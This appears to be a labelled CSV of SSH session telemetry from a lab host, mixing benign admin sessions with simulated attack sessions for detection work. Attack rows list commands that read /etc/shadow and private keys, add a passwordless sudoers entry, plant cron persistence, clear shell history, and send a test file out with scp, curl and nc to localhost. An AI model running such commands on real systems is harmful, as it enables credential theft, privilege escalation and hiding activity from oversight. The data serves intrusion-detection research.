session_id,user,account,client_ip,target_ip,target_hostname,session_start,session_end,duration_sec,session_start_is_estimated,session_end_is_estimated,duration_sec_is_estimated,commands,event_types,raw_event_count,file_transfer_bytes,protocol,has_command_telemetry,start_time,end_time,duration_sec_feat,start_hour,off_hours_flag,is_weekend,command_count,unique_command_ratio,avg_command_length,command_entropy,flag_cred_access,flag_privesc,flag_persistence,flag_log_tamper,flag_recon,flag_exfil
19fc845998a4869d000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:05:23.765+0000,2026-08-03T15:05:27.595+0000,3,False,False,False,"['ls -la /var/log/', 'echo TAG:atk_log_tamper_0d621f', 'cat /var/log/auth.log 2>/dev/null | tail -20', 'history -c', 'last', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",8,0,SSH,1,2026-08-03 15:05:23.765000+00:00,2026-08-03 15:05:27.595000+00:00,3.0,15,0,0,4.0,1.0,18.5,2.0,0.0,0.0,0.0,1.0,1.0,0.0
19fc845b2df4636d000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:05:30.345+0000,2026-08-03T15:05:35.345+0000,4,False,False,False,"['echo TAG:ben_auditor_bc710a', 'cat /etc/passwd', 'ls -la /etc/', 'w', 'last -n 10', 'uptime', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",9,0,SSH,1,2026-08-03 15:05:30.345000+00:00,2026-08-03 15:05:35.345000+00:00,4.0,15,0,0,5.0,1.0,8.8,2.321928094887362,1.0,0.0,0.0,0.0,1.0,0.0
19fc845cfd291d7e000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:05:37.845+0000,2026-08-03T15:05:42.844+0000,4,False,False,False,"['echo TAG:atk_persistence_63102e', ""echo '#!/bin/bash' > /tmp/.cache_update_atk_persistence_63102e.sh"", '(crontab -l 2>/dev/null; echo \\', 'crontab -l', 'crontab -l | grep -v atk_persistence_63102e | crontab -', 'rm -f /tmp/.cache_update_atk_persistence_63102e.sh', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",9,0,SSH,1,2026-08-03 15:05:37.845000+00:00,2026-08-03 15:05:42.844000+00:00,4.0,15,0,0,5.0,1.0,42.2,2.321928094887362,0.0,0.0,1.0,0.0,0.0,0.0
19fc845f07f4fc9f000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:05:46.064+0000,2026-08-03T15:05:51.094+0000,4,False,False,False,"['echo TAG:ben_admin_5fc703', 'ls -la', 'df -h', 'systemctl --no-pager status sshd', 'uptime', 'free -m', 'who', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",10,0,SSH,1,2026-08-03 15:05:46.064000+00:00,2026-08-03 15:05:51.094000+00:00,4.0,15,0,0,6.0,1.0,9.833333333333334,2.584962500721156,0.0,0.0,0.0,0.0,1.0,0.0
19fc8461031b8185000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:05:54.345+0000,2026-08-03T15:05:59.594+0000,5,False,False,False,"[""echo 'test-data-atk_exfil_0febc1' > /tmp/exfil_test_atk_exfil_0febc1.txt"", 'echo TAG:atk_exfil_0febc1', 'scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_0febc1.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'curl -s -m 3 -X POST -F file=@/tmp/exfil_test_atk_exfil_0febc1.txt http://127.0.0.1:9999/upload 2>&1 | head -3', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_0febc1.txt 2>&1', 'rm -f /tmp/exfil_test_atk_exfil_0febc1.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",9,0,SSH,1,2026-08-03 15:05:54.345000+00:00,2026-08-03 15:05:59.594000+00:00,5.0,15,0,0,5.0,1.0,86.2,2.321928094887362,0.0,0.0,0.0,0.0,0.0,1.0
19fc8462e5734ccb000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:06:01.958+0000,2026-08-03T15:06:08.844+0000,6,False,False,False,"['echo TAG:atk_recon_888aeb', 'whoami', 'id', 'uname -a', 'hostname', 'cat /etc/os-release', 'ps aux', 'netstat -tulnp', 'who', 'last -n 5', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",13,0,SSH,1,2026-08-03 15:06:01.958000+00:00,2026-08-03 15:06:08.844000+00:00,6.0,15,0,0,9.0,1.0,8.333333333333334,3.169925001442312,0.0,0.0,0.0,0.0,1.0,0.0
19fc84656b76f22e000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:06:12.342+0000,2026-08-03T15:06:16.345+0000,3,False,False,False,"['echo TAG:ben_dev_07365d', 'cd /tmp && ls -la', 'git status', 'cat /etc/os-release', 'python3 --version', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,SSH,1,2026-08-03 15:06:12.342000+00:00,2026-08-03 15:06:16.345000+00:00,3.0,15,0,0,4.0,1.0,15.75,2.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc8466ec69c85d000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:06:18.596+0000,2026-08-03T15:06:24.595+0000,5,False,False,False,"['echo TAG:ben_auditor_a1990d', 'cat /etc/passwd', 'ls -la /etc/', 'w', 'last -n 10', 'uptime', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",9,0,SSH,1,2026-08-03 15:06:18.596000+00:00,2026-08-03 15:06:24.595000+00:00,5.0,15,0,0,5.0,1.0,8.8,2.321928094887362,1.0,0.0,0.0,0.0,1.0,0.0
testsessionproof12345,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:22:30.991000+00:00,2026-08-03T15:22:30.991000+00:00,0,True,True,True,['pwd_proof12345'],['KBD_INPUT'],1,0,SSH,1,2026-08-03 15:22:30.991000+00:00,2026-08-03 15:22:30.991000+00:00,0.0,15,0,0,1.0,1.0,14.0,-0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc856e3039d731000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T15:24:19.107+0000,2026-08-03T15:25:08.358+0000,49,False,False,False,"['getent passwd', 'cat /etc/passwd', 'pwd', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",6,0,SSH,1,2026-08-03 15:24:19.107000+00:00,2026-08-03 15:25:08.358000+00:00,49.0,15,0,0,3.0,1.0,10.333333333333334,1.584962500721156,1.0,0.0,0.0,0.0,0.0,0.0
19fc88ffbda8e75f000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:26:38.902+0000,2026-08-03T16:27:03.902+0000,24,False,False,False,"['echo TAG:ben_admin_65ed6d', 'ls -la', 'df -h', 'systemctl --no-pager status sshd', 'uptime', 'free -m', 'who', 'ping -W 6 -c 13 1.1.1.1', 'zip backup.zip *.csv', 'nslookup<NL>server 8.8.8.8', 'cp /var/log/mail.warn/* /backup/mailwarn/', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",14,0,SSH,1,2026-08-03 16:26:38.902000+00:00,2026-08-03 16:27:03.902000+00:00,24.0,16,0,0,10.0,1.0,16.6,3.3219280948873626,0.0,0.0,0.0,0.0,1.0,0.0
19fc89065c0eb71e000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:27:05.811+0000,2026-08-03T16:27:15.152+0000,9,False,False,False,"['echo TAG:atk_recon_6e96e2', 'whoami', 'id', 'uname -a', 'cat /etc/os-release', 'hostname', 'ps aux', 'netstat -tulnp', 'who', 'last -n 5', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",13,0,SSH,1,2026-08-03 16:27:05.811000+00:00,2026-08-03 16:27:15.152000+00:00,9.0,16,0,0,9.0,1.0,8.333333333333334,3.169925001442312,0.0,0.0,0.0,0.0,1.0,0.0
19fc89096562f53f000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:27:18.516+0000,2026-08-03T16:27:25.908+0000,7,False,False,False,"['echo TAG:atk_recon_a146ab', 'whoami', 'id', 'uname -a', 'hostname', 'cat /etc/os-release', 'ps aux', 'netstat -tulnp', 'who', 'last -n 5', 'exit']","['KBD_INPUT', 'SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",13,0,SSH,1,2026-08-03 16:27:18.516000+00:00,2026-08-03 16:27:25.908000+00:00,7.0,16,0,0,9.0,1.0,8.333333333333334,3.169925001442312,0.0,0.0,0.0,0.0,1.0,0.0
19fc890be9cc2ea3000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:27:28.653+0000,2026-08-03T16:27:39.153+0000,10,False,False,False,"['echo TAG:ben_admin_d0e09d', 'ls -la', 'df -h', 'systemctl --no-pager status sshd', 'uptime', 'free -m', 'who', 'du -ch', 'cd /etc/profile.d', 'du -d 2', 'mv /var/log/mail.warn/* /backup/mailwarn/', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",14,0,SSH,1,2026-08-03 16:27:28.653000+00:00,2026-08-03 16:27:39.153000+00:00,10.0,16,0,0,10.0,1.0,13.0,3.3219280948873626,0.0,0.0,0.0,0.0,1.0,0.0
19fc890f273e993e000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:27:41.903+0000,2026-08-03T16:27:49.652+0000,7,False,False,False,"['echo TAG:ben_dba_ca0410', 'ls -la /var/lib', 'du -sh /var/log', 'ps aux | grep -i sql', 'cat /etc/hosts', 'find /home -type f -exec basename {} \\\\;', 'mv -i testfile /srv/www/', 'find /tmp -iregex \\', 'mv /etc /backup/etc/', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",12,0,SSH,1,2026-08-03 16:27:41.903000+00:00,2026-08-03 16:27:49.652000+00:00,7.0,16,0,0,8.0,1.0,20.875,3.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc8911ec8c6ab5000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:27:53.403+0000,2026-08-03T16:27:58.653+0000,5,False,False,False,"['echo TAG:atk_exfil_beb885', ""echo 'test-data-atk_exfil_beb885' > /tmp/exfil_test_atk_exfil_beb885.txt"", 'scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_beb885.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'curl -s -m 3 -X POST -F file=@/tmp/exfil_test_atk_exfil_beb885.txt http://127.0.0.1:9999/upload 2>&1 | head -3', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_beb885.txt 2>&1', 'rm -f /tmp/exfil_test_atk_exfil_beb885.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",9,0,SSH,1,2026-08-03 16:27:53.403000+00:00,2026-08-03 16:27:58.653000+00:00,5.0,16,0,0,5.0,1.0,86.2,2.321928094887362,0.0,0.0,0.0,0.0,0.0,1.0
19fc8914297dcca6000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:28:02.339+0000,2026-08-03T16:28:05.903+0000,3,False,False,False,"['echo TAG:atk_log_tamper_8475ec', 'ls -la /var/log/', 'cat /var/log/auth.log 2>/dev/null | tail -20', 'history -c', 'last', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,SSH,1,2026-08-03 16:28:02.339000+00:00,2026-08-03 16:28:05.903000+00:00,3.0,16,0,0,4.0,1.0,18.5,2.0,0.0,0.0,0.0,1.0,1.0,0.0
19fc8915e88c4e34000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:28:09.654+0000,2026-08-03T16:28:17.068+0000,7,False,False,False,"['echo TAG:ben_dev_204fa5', 'cd /tmp && ls -la', 'git status', 'cat /etc/os-release', 'python3 --version', ""sed '10d' file.txt"", 'find /srv -type f -exec cat {} \\\\;', ""touch -d 'next week' future.txt"", 'gzip user.log', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",12,0,SSH,1,2026-08-03 16:28:09.654000+00:00,2026-08-03 16:28:17.068000+00:00,7.0,16,0,0,8.0,1.0,19.875,3.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc89186dbebe33000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:28:19.903+0000,2026-08-03T16:28:23.902+0000,3,False,False,False,"['cat /etc/shadow', 'echo TAG:atk_cred_access_b34da2', 'find /root /home /etc -name id_rsa 2>/dev/null', 'cat ~/.ssh/authorized_keys 2>/dev/null', 'find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",8,0,SSH,1,2026-08-03 16:28:19.903000+00:00,2026-08-03 16:28:23.902000+00:00,3.0,16,0,0,4.0,1.0,41.25,2.0,1.0,0.0,1.0,0.0,0.0,0.0
19fc8919f850a2ef000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:28:26.169+0000,2026-08-03T16:28:29.376+0000,3,False,False,False,"['echo TAG:atk_cred_access_e7f01a', 'cat /etc/shadow', 'find /root /home /etc -name id_rsa 2>/dev/null', 'cat ~/.ssh/authorized_keys 2>/dev/null', 'find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",8,0,SSH,1,2026-08-03 16:28:26.169000+00:00,2026-08-03 16:28:29.376000+00:00,3.0,16,0,0,4.0,1.0,41.25,2.0,1.0,0.0,1.0,0.0,0.0,0.0
19fc891ba9278335000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:28:33.153+0000,2026-08-03T16:28:39.903+0000,6,False,False,False,"['echo TAG:ben_dev_563b69', 'cd /tmp && ls -la', 'git status', 'cat /etc/os-release', 'python3 --version', 'gzip folder-listing.txt', 'bzip2 largefile.iso', 'gzip img001.png', 'find /srv -type c', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",12,0,SSH,1,2026-08-03 16:28:33.153000+00:00,2026-08-03 16:28:39.903000+00:00,6.0,16,0,0,8.0,1.0,17.125,3.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc891e26f6cd9d000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:28:43.404+0000,2026-08-03T16:28:45.404+0000,1,False,False,False,"['echo \\', 'echo TAG:atk_persistence_7a79bb', 'rm /var/spool/cron/crontabs/persistevil -f', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",6,0,SSH,1,2026-08-03 16:28:43.404000+00:00,2026-08-03 16:28:45.404000+00:00,1.0,16,0,0,2.0,1.0,24.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc891f97a0c2f6000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:28:49.153+0000,2026-08-03T16:29:12.404+0000,23,False,False,False,"['ls -la', 'echo TAG:ben_admin_9ebc32', 'df -h', 'systemctl --no-pager status sshd', 'uptime', 'free -m', 'who', 'cd /usr/share/emacs', 'free -k -s 30']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",11,0,SSH,1,2026-08-03 16:28:49.153000+00:00,2026-08-03 16:29:12.404000+00:00,23.0,16,0,0,8.0,1.0,11.375,3.0,0.0,0.0,0.0,0.0,1.0,0.0
19fc8925c684600b000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:29:14.656+0000,2026-08-03T16:29:21.403+0000,6,False,False,False,"['echo TAG:ben_dba_453f4c', 'ls -la /var/lib', 'du -sh /var/log', 'ps aux | grep -i sql', 'cat /etc/hosts', 'cp /var/log/lightdm/* /backup/lightdm/', 'find /home -type f -links +1', 'mv *.txt backup/', 'find /opt -fstype ext4', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",12,0,SSH,1,2026-08-03 16:29:14.656000+00:00,2026-08-03 16:29:21.403000+00:00,6.0,16,0,0,8.0,1.0,21.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc892811366e4e000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:29:24.153+0000,2026-08-03T16:29:30.653+0000,6,False,False,False,"['sudo -l', 'echo TAG:atk_privesc_dbf568', 'useradd -m tempuser_atk_privesc_dbf568', ""echo 'tempuser_atk_privesc_dbf568 ALL=(ALL) NOPASSWD:ALL' | tee /etc/sudoers.d/tempuser_atk_privesc_dbf568 > /dev/null"", 'id tempuser_atk_privesc_dbf568', 'rm -f /etc/sudoers.d/tempuser_atk_privesc_dbf568', 'userdel -r tempuser_atk_privesc_dbf568', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",10,0,SSH,1,2026-08-03 16:29:24.153000+00:00,2026-08-03 16:29:30.653000+00:00,6.0,16,0,0,6.0,1.0,46.5,2.584962500721156,0.0,1.0,0.0,0.0,1.0,0.0
19fc892a90579d62000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:29:34.093+0000,2026-08-03T16:29:39.154+0000,4,False,False,False,"['echo TAG:atk_exfil_c05635', ""echo 'test-data-atk_exfil_c05635' > /tmp/exfil_test_atk_exfil_c05635.txt"", 'scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_c05635.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'curl -s -m 3 -X POST -F file=@/tmp/exfil_test_atk_exfil_c05635.txt http://127.0.0.1:9999/upload 2>&1 | head -3', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_c05635.txt 2>&1', 'rm -f /tmp/exfil_test_atk_exfil_c05635.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",9,0,SSH,1,2026-08-03 16:29:34.093000+00:00,2026-08-03 16:29:39.154000+00:00,4.0,16,0,0,5.0,1.0,86.2,2.321928094887362,0.0,0.0,0.0,0.0,0.0,1.0
19fc892c99459761000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:29:42.404+0000,2026-08-03T16:29:51.904+0000,9,False,False,False,"['echo TAG:ben_auditor_b1bd7e', 'cat /etc/passwd', 'ls -la /etc/', 'w', 'last -n 10', 'uptime', 'ls --color=auto', 'ls ~', 'find /tmp -perm -u=s', ""grep -v 'tmp' filelist.txt"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",13,0,SSH,1,2026-08-03 16:29:42.404000+00:00,2026-08-03 16:29:51.904000+00:00,9.0,16,0,0,9.0,1.0,12.11111111111111,3.169925001442312,1.0,0.0,0.0,0.0,1.0,0.0
19fc892facee397b000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:29:55.154+0000,2026-08-03T16:30:23.154+0000,27,False,False,False,"['echo TAG:ben_dba_fdd374', 'ls -la /var/lib', 'du -sh /var/log', 'ps aux | grep -i sql', 'cat /etc/hosts', 'find /home -type f -exec grep \\', 'sleep 5', 'mv data.csv backup.csv', 'sleep 10000']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",11,0,SSH,1,2026-08-03 16:29:55.154000+00:00,2026-08-03 16:30:23.154000+00:00,27.0,16,0,0,8.0,1.0,16.875,3.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc8936e36a9ce6000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:30:24.904+0000,2026-08-03T16:30:31.661+0000,6,False,False,False,"['echo TAG:atk_log_tamper_0d4105', 'set +o history', ""echo 'set +o history' >> ~/.bashrc"", '. ~/.bashrc', 'history -c', ""sed -i 's/set +o history//g' ~/.bashrc"", '. ~/.bashrc', 'set -o history', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",11,0,SSH,1,2026-08-03 16:30:24.904000+00:00,2026-08-03 16:30:31.661000+00:00,6.0,16,0,0,7.0,0.8571428571428571,18.857142857142858,2.521640636343318,0.0,0.0,0.0,1.0,0.0,0.0
19fc893972313a6d000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:30:35.154+0000,2026-08-03T16:30:42.155+0000,6,False,False,False,"['echo TAG:ben_auditor_405dd8', 'cat /etc/passwd', 'ls -la /etc/', 'w', 'last -n 10', 'uptime', 'ls -r', ""find . -name '*.log' -exec tail -n 5 {} \\\\;"", 'find /data -type b', 'find /tmp -ctime -2 -type d', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",13,0,SSH,1,2026-08-03 16:30:35.154000+00:00,2026-08-03 16:30:42.155000+00:00,6.0,16,0,0,9.0,1.0,15.222222222222221,3.169925001442312,1.0,0.0,0.0,0.0,1.0,0.0
